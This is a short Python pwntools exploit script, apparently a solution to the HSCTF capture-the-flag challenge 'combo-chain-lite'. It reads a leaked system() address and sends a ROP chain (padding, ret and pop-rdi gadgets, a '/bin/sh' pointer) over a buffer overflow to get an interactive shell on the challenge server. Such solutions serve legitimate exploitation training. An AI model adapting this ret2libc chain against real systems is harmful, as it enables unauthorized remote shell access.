from pwn import *
#p = process('./combo-chain-lite')
#gdb.attach(p)
p = remote('pwn.hsctf.com',3131)
pop_rdi = p64(0x0000000000401273)
binsh = p64(0x402051)
ret = p64(0x000000000040101a)

p.recvuntil("Here's your free computer: ")
system = int(p.recvline().strip(),16)
print hex(system)
p.recvuntil("MBO CARNAGE!: ")

exp  = "a"*16
exp += ret
exp += pop_rdi
exp += binsh
exp += p64(system)

p.sendline(exp)

p.interactive()
